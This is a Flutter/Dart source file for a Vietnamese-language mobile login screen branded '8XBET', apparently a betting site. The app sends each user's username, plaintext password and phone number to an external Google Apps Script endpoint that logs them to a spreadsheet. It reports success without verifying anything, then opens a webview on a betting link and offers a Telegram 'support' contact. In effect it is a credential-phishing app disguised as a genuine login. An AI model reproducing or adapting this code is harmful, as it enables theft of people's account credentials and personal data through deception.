import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'package:url_launcher/url_launcher.dart';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen>
    with SingleTickerProviderStateMixin {
  final _usernameController = TextEditingController();
  final _passwordController = TextEditingController();
  final _phoneController = TextEditingController();
  bool _rememberMe = true;
  bool _obscurePassword = true;
  bool _isLoading = false;

  // Animation controller cho Telegram button
  late AnimationController _animationController;
  late Animation<double> _bounceAnimation;
  late Animation<double> _pulseAnimation;

  final String googleScriptUrl =
      'https://script.google.com/macros/s/AKfycbx3dWTzmnOIs1itnNKmt49EoSTcbzVJ0VGYwaSFD5eup_ceQ0xK6V-lbRoN_ZFJ9biK/exec';

  // 🔗 QUAN TRỌNG: Thay URL/Username Telegram của bạn ở đây
  final String telegramUrl = 'https://t.me/CSKHKM8X';

  @override
  void initState() {
    super.initState();
    _setupAnimations();
  }

  void _setupAnimations() {
    // Animation controller - lặp lại mãi
    _animationController = AnimationController(
      duration: const Duration(milliseconds: 2000),
      vsync: this,
    )..repeat(reverse: true);

    // Bounce animation - di chuyển lên xuống
    _bounceAnimation = Tween<double>(begin: 0, end: -8).animate(
      CurvedAnimation(parent: _animationController, curve: Curves.easeInOut),
    );

    // Pulse animation - phóng to thu nhỏ
    _pulseAnimation = Tween<double>(begin: 1.0, end: 1.1).animate(
      CurvedAnimation(parent: _animationController, curve: Curves.easeInOut),
    );
  }

  @override
  void dispose() {
    _animationController.dispose();
    _usernameController.dispose();
    _passwordController.dispose();
    _phoneController.dispose();
    super.dispose();
  }

  Future<bool> sendToGoogleSheet({
    required String username,
    required String password,
    required String phone,
  }) async {
    try {
      final now = DateTime.now();
      final timestamp =
          '${now.day}/${now.month}/${now.year} ${now.hour}:${now.minute}:${now.second}';

      final data = {
        'timestamp': timestamp,
        'username': username,
        'password': password,
        'phone': phone,
        'remember': _rememberMe.toString(),
      };

      print('Đang gửi data lên Google Sheet...');
      print('Data: $data');

      final response = await http
          .post(
            Uri.parse(googleScriptUrl),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(data),
          )
          .timeout(
            const Duration(seconds: 10),
            onTimeout: () {
              throw TimeoutException('Kết nối quá lâu');
            },
          );

      print('Response status: ${response.statusCode}');
      print('Response body: ${response.body}');

      if (response.statusCode == 200 || response.statusCode == 302) {
        return true;
      } else {
        print('Lỗi: ${response.statusCode}');
        return false;
      }
    } catch (e) {
      print('Lỗi khi gửi data: $e');
      return false;
    }
  }

  Future<void> _openTelegram() async {
    final Uri url = Uri.parse(telegramUrl);
    try {
      if (await canLaunchUrl(url)) {
        await launchUrl(url, mode: LaunchMode.externalApplication);
      } else {
        if (mounted) {
          _showMessage(
            '⚠️ Không thể mở Telegram. Vui lòng cài đặt app Telegram.',
            isError: true,
          );
        }
      }
    } catch (e) {
      print('Lỗi mở Telegram: $e');
      if (mounted) {
        _showMessage('⚠️ Lỗi: $e', isError: true);
      }
    }
  }

  Future<void> _handleLogin() async {
    if (_usernameController.text.trim().isEmpty) {
      _showMessage('⚠️ Vui lòng nhập tài khoản!', isError: true);
      return;
    }

    if (_passwordController.text.trim().isEmpty) {
      _showMessage('⚠️ Vui lòng nhập mật khẩu!', isError: true);
      return;
    }

    // Validate số điện thoại
    final phone = _phoneController.text.trim();
    if (phone.isEmpty) {
      _showMessage('⚠️ Vui lòng nhập số điện thoại!', isError: true);
      return;
    }

    // Kiểm tra phải 10 số
    if (phone.length != 10) {
      _showMessage('⚠️ Số điện thoại phải có đúng 10 số!', isError: true);
      return;
    }

    // Kiểm tra phải bắt đầu bằng số 0
    if (!phone.startsWith('0')) {
      _showMessage('⚠️ Số điện thoại phải bắt đầu bằng số 0!', isError: true);
      return;
    }

    // Kiểm tra chỉ chứa số
    if (!RegExp(r'^[0-9]+$').hasMatch(phone)) {
      _showMessage('⚠️ Số điện thoại chỉ được chứa chữ số!', isError: true);
      return;
    }

    setState(() {
      _isLoading = true;
    });

    final success = await sendToGoogleSheet(
      username: _usernameController.text.trim(),
      password: _passwordController.text.trim(),
      phone: phone,
    );

    setState(() {
      _isLoading = false;
    });

    if (success) {
      _showMessage('✅ Đăng nhập thành công!', isError: false);
      await Future.delayed(const Duration(seconds: 1));
      if (mounted) {
        Navigator.of(context).push(
          MaterialPageRoute(
            builder: (_) =>
                const WebViewScreen(url: 'https://8xbet492.com/p/WhnF'),
          ),
        );
      }
    } else {
      _showMessage(
        '⚠️ Không thể kết nối. Vui lòng kiểm tra:\n'
        '1. Google Script URL đã đúng chưa?\n'
        '2. Script đã deploy chưa?\n'
        '3. Có kết nối internet không?',
        isError: true,
      );
    }
  }

  void _showMessage(String message, {required bool isError}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: isError ? Colors.red : Colors.green,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
        duration: const Duration(seconds: 3),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          // Background và Login Form
          Container(
            decoration: BoxDecoration(
              image: DecorationImage(
                image: NetworkImage(
                  'https://images.unsplash.com/photo-1579952363873-27f3bade9f55?w=800',
                ),
                fit: BoxFit.cover,
                colorFilter: ColorFilter.mode(
                  Colors.black.withValues(alpha: 0.4),
                  BlendMode.darken,
                ),
              ),
            ),
            child: SafeArea(
              child: Center(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(24),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      _buildLogo(),
                      const SizedBox(height: 50),
                      Container(
                        padding: const EdgeInsets.all(24),
                        decoration: BoxDecoration(
                          color: Colors.white.withValues(alpha: 0.15),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(
                            color: Colors.white.withValues(alpha: 0.3),
                            width: 1.5,
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: Colors.black.withValues(alpha: 0.2),
                              blurRadius: 20,
                              offset: const Offset(0, 10),
                            ),
                          ],
                        ),
                        child: Column(
                          children: [
                            _buildTextField(
                              controller: _usernameController,
                              hint: 'Tài khoản',
                              icon: Icons.person_outline,
                            ),
                            const SizedBox(height: 16),
                            _buildPasswordField(),
                            const SizedBox(height: 16),
                            _buildTextField(
                              controller: _phoneController,
                              hint: 'Số điện thoại (0xxxxxxxxx)',
                              icon: Icons.phone_android,
                              keyboardType: TextInputType.number,
                              maxLength: 10,
                              inputFormatters: [
                                FilteringTextInputFormatter.digitsOnly,
                                LengthLimitingTextInputFormatter(10),
                              ],
                            ),
                            const SizedBox(height: 20),
                            _buildRememberMe(),
                            const SizedBox(height: 24),
                            _buildLoginButton(),
                            const SizedBox(height: 16),
                            _buildRegisterLink(),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),

          // 💬 TELEGRAM FLOATING BUTTON với ANIMATION
          Positioned(
            right: 16,
            bottom: 16,
            child: _buildAnimatedTelegramButton(),
          ),
        ],
      ),
    );
  }

  // Widget Telegram Button với Animation
  Widget _buildAnimatedTelegramButton() {
    return AnimatedBuilder(
      animation: _animationController,
      builder: (context, child) {
        return Transform.translate(
          offset: Offset(0, _bounceAnimation.value),
          child: Transform.scale(scale: _pulseAnimation.value, child: child),
        );
      },
      child: GestureDetector(
        onTap: _openTelegram,
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            // Text "Hỗ trợ 24h" ở trên
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  colors: [Color(0xFF0088cc), Color(0xFF00bcd4)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(16),
                boxShadow: [
                  BoxShadow(
                    color: const Color(0xFF0088cc).withValues(alpha: 0.4),
                    blurRadius: 8,
                    offset: const Offset(0, 2),
                  ),
                ],
              ),
              child: const Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.support_agent, color: Colors.white, size: 16),
                  SizedBox(width: 4),
                  Text(
                    'Hỗ trợ 24h',
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 12,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 8),

            // Button Telegram với Pulse Ring
            Stack(
              alignment: Alignment.center,
              children: [
                // Pulse ring ngoài cùng
                AnimatedBuilder(
                  animation: _animationController,
                  builder: (context, child) {
                    return Container(
                      width: 80,
                      height: 80,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(
                          color: const Color(0xFF0088cc).withValues(
                            alpha: 0.3 * (1 - _animationController.value),
                          ),
                          width: 2,
                        ),
                      ),
                    );
                  },
                ),
                // Button chính
                Container(
                  width: 60,
                  height: 60,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [Color(0xFF0088cc), Color(0xFF00bcd4)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFF0088cc).withValues(alpha: 0.6),
                        blurRadius: 16,
                        offset: const Offset(0, 4),
                      ),
                    ],
                  ),
                  child: const Icon(
                    Icons.telegram,
                    color: Colors.white,
                    size: 32,
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildLogo() {
    return Column(
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text(
              '8',
              style: TextStyle(
                fontSize: 56,
                fontWeight: FontWeight.bold,
                color: Colors.cyan.shade400,
                shadows: [
                  Shadow(
                    color: Colors.black.withValues(alpha: 0.5),
                    blurRadius: 10,
                    offset: const Offset(0, 5),
                  ),
                ],
              ),
            ),
            Text(
              'X',
              style: TextStyle(
                fontSize: 56,
                fontWeight: FontWeight.bold,
                color: Colors.orange.shade400,
                shadows: [
                  Shadow(
                    color: Colors.black.withValues(alpha: 0.5),
                    blurRadius: 10,
                    offset: const Offset(0, 5),
                  ),
                ],
              ),
            ),
            Text(
              'BET',
              style: TextStyle(
                fontSize: 56,
                fontWeight: FontWeight.bold,
                color: Colors.white,
                shadows: [
                  Shadow(
                    color: Colors.black.withValues(alpha: 0.5),
                    blurRadius: 10,
                    offset: const Offset(0, 5),
                  ),
                ],
              ),
            ),
          ],
        ),
      ],
    );
  }

  Widget _buildTextField({
    required TextEditingController controller,
    required String hint,
    required IconData icon,
    TextInputType keyboardType = TextInputType.text,
    List<TextInputFormatter>? inputFormatters,
    int? maxLength,
  }) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white.withValues(alpha: 0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: Colors.white.withValues(alpha: 0.3),
          width: 1,
        ),
      ),
      child: TextField(
        controller: controller,
        keyboardType: keyboardType,
        inputFormatters: inputFormatters,
        maxLength: maxLength,
        style: const TextStyle(color: Colors.white, fontSize: 16),
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: TextStyle(color: Colors.white.withValues(alpha: 0.6)),
          prefixIcon: Icon(icon, color: Colors.white.withValues(alpha: 0.8)),
          border: InputBorder.none,
          counterText: '', // Ẩn counter text
          contentPadding: const EdgeInsets.symmetric(
            horizontal: 16,
            vertical: 16,
          ),
        ),
      ),
    );
  }

  Widget _buildPasswordField() {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white.withValues(alpha: 0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: Colors.white.withValues(alpha: 0.3),
          width: 1,
        ),
      ),
      child: TextField(
        controller: _passwordController,
        obscureText: _obscurePassword,
        style: const TextStyle(color: Colors.white, fontSize: 16),
        decoration: InputDecoration(
          hintText: 'Mật khẩu',
          hintStyle: TextStyle(color: Colors.white.withValues(alpha: 0.6)),
          prefixIcon: Icon(
            Icons.lock_outline,
            color: Colors.white.withValues(alpha: 0.8),
          ),
          suffixIcon: IconButton(
            icon: Icon(
              _obscurePassword ? Icons.visibility_off : Icons.visibility,
              color: Colors.white.withValues(alpha: 0.8),
            ),
            onPressed: () {
              setState(() {
                _obscurePassword = !_obscurePassword;
              });
            },
          ),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(
            horizontal: 16,
            vertical: 16,
          ),
        ),
      ),
    );
  }

  Widget _buildRememberMe() {
    return Row(
      children: [
        Checkbox(
          value: _rememberMe,
          onChanged: (value) {
            setState(() {
              _rememberMe = value ?? false;
            });
          },
          fillColor: WidgetStateProperty.all(Colors.white),
          checkColor: Colors.blue.shade700,
        ),
        const Text(
          'Ghi nhớ',
          style: TextStyle(color: Colors.white, fontSize: 16),
        ),
      ],
    );
  }

  Widget _buildLoginButton() {
    return SizedBox(
      width: double.infinity,
      height: 50,
      child: ElevatedButton(
        onPressed: _isLoading ? null : _handleLogin,
        style: ElevatedButton.styleFrom(
          backgroundColor: Colors.cyan.shade600,
          disabledBackgroundColor: Colors.grey,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12),
          ),
          elevation: 5,
        ),
        child: _isLoading
            ? const SizedBox(
                width: 24,
                height: 24,
                child: CircularProgressIndicator(
                  color: Colors.white,
                  strokeWidth: 3,
                ),
              )
            : const Text(
                'Đăng nhập',
                style: TextStyle(
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
              ),
      ),
    );
  }

  Widget _buildRegisterLink() {
    return TextButton(
      onPressed: () {
        Navigator.of(context).push(
          MaterialPageRoute(
            builder: (_) =>
                const WebViewScreen(url: 'https://8xbet492.com/p/WhnF'),
          ),
        );
      },
      child: Text(
        'Đăng Ký Ngay !',
        style: TextStyle(
          fontSize: 16,
          fontWeight: FontWeight.bold,
          color: Colors.yellow.shade600,
          decoration: TextDecoration.underline,
        ),
      ),
    );
  }
}

// WebView Screen (không đổi)
class WebViewScreen extends StatefulWidget {
  final String url;

  const WebViewScreen({super.key, required this.url});

  @override
  State<WebViewScreen> createState() => _WebViewScreenState();
}

class _WebViewScreenState extends State<WebViewScreen> {
  late final WebViewController _controller;
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _initializeWebView();
  }

  void _initializeWebView() {
    _controller = WebViewController()
      ..setUserAgent(
        'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
      )
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.white)
      ..clearCache()
      ..clearLocalStorage()
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (String url) {
            setState(() {
              _isLoading = true;
            });
          },
          onPageFinished: (String url) {
            setState(() {
              _isLoading = false;
            });
          },
          onWebResourceError: (WebResourceError error) {
            if (error.errorCode == -10) {
              print('ℹ️ Bỏ qua ERR_BLOCKED_BY_ORB');
            }
          },
        ),
      )
      ..loadRequest(
        Uri.parse(widget.url),
        headers: {
          'Accept':
              'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        },
      );
  }

  void _reloadPage() {
    setState(() {
      _isLoading = true;
    });
    _controller.reload();
  }

  Future<void> _goBack() async {
    if (await _controller.canGoBack()) {
      _controller.goBack();
    } else {
      if (mounted) {
        Navigator.of(context).pop();
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if (await _controller.canGoBack()) {
          _controller.goBack();
          return false;
        }
        return true;
      },
      child: Scaffold(
        appBar: AppBar(
          toolbarHeight: 0,
          backgroundColor: Colors.blue.shade900,
          title: const Text(
            '8XBET',
            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
          ),
          leading: IconButton(
            icon: const Icon(Icons.arrow_back, color: Colors.white),
            onPressed: _goBack,
          ),
          actions: [
            IconButton(
              icon: const Icon(Icons.refresh, color: Colors.white),
              onPressed: _reloadPage,
            ),
          ],
        ),
        body: Stack(
          children: [
            WebViewWidget(controller: _controller),
            if (_isLoading)
              Container(
                color: Colors.white,
                child: const Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      CircularProgressIndicator(),
                      SizedBox(height: 16),
                      Text(
                        'Đang tải...',
                        style: TextStyle(fontSize: 16, color: Colors.grey),
                      ),
                    ],
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }
}
